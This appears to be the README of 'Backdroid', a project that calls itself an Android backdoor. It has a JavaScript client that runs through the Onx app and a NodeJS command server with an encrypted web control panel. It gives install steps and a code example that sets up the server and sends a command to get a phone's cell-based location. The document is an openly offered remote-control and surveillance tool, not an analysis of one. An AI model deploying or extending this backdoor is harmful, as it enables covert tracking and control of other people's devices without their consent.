Backdroid v1.0.0 BETA
==================================================

What is this?
--------------------------------------

it's a backdoor for Android formed by a client written in JavaScript, with the help of http://onx.ms/, and a server written in NodeJS.

Features
--------------------------------------

	Encrypted connection in AES-256
	Web panel control
	Very flexible and scalable to add new features

How to install?
--------------------------------------

  - Download and install NodeJS (http://nodejs.org/).
  - Install backdroid with npm by the console (npm install -g backdroid).
  - Download and install Onx App for Android (https://play.google.com/store/apps/details?id=com.microsoft.onx.app).
  - Login in https://www.onx.ms/.
  - Download backdroid proyect (https://github.com/yeikos/backdroid/zipball/master).
  - Copy client.js source code (https://github.com/yeikos/backdroid/blob/master/client.js) and paste it into https://www.onx.ms/#!createScriptPage (new rule).
  - Go to examples project folder and launch each example by the console (node SCRIPTNAME).

Example
--------------------------------------
	
	var backdroid = require('backdroid');

	backdroid.setCommand('location', { provider: 'CELL' }, function(command, value) {

		console.log('[sent]', command, value);

	}, function(command, value, response) {

		console.log('[response]', command, value, response);

	});

	backdroid.createCommandServer({

		password: 'secret',
		password_encryptation: 'secret123',
		
		port: 8888

	});